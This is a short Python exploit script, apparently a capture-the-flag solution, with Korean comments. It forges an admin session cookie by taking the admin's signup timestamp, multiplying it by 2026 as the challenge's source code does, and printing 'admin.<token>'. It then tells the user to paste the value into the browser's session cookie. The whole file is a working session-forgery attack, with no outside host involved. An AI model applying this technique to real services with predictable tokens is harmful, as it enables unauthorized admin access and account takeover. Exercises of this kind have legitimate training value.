from datetime import datetime, timezone

# 1. 문제 사이트의 /welcome 페이지에서 admin의 가입 시간을 복사해서 아래에 넣으세요.
# 예시 포맷: "22/01/2026, 09:11:49 UTC"
admin_time_str = "22/01/2026, 00:10:01 UTC" 

# 포맷이 정확해야 합니다 (UTC 포함)
# 예: admin_time_str = "22/05/2024, 12:00:00 UTC"

def solve(time_str):
    try:
        # 문자열에서 " UTC" 제거 및 파싱
        dt_str = time_str.replace(" UTC", "")
        dt_obj = datetime.strptime(dt_str, "%d/%m/%Y, %H:%M:%S")
        
        # UTC 타임스탬프로 변환 (정수형)
        dt_obj = dt_obj.replace(tzinfo=timezone.utc)
        timestamp = int(dt_obj.timestamp())
        
        print(f"[*] Admin Created Timestamp: {timestamp}")
        
        # 세션 토큰 계산 (소스코드 로직: created_at * 2026)
        token = timestamp * 2026
        
        # 최종 쿠키 값 생성
        cookie_value = f"admin.{token}"
        
        print("-" * 30)
        print(f"[+] Forged Cookie: {cookie_value}")
        print("-" * 30)
        print("이 값을 브라우저의 'session' 쿠키에 넣고 새로고침 하세요.")
        
    except ValueError as e:
        print(f"[!] 날짜 포맷 에러: {e}")
        print("형식을 정확히 맞춰주세요. 예: 22/01/2026, 09:11:49 UTC")

if __name__ == "__main__":
    solve(admin_time_str)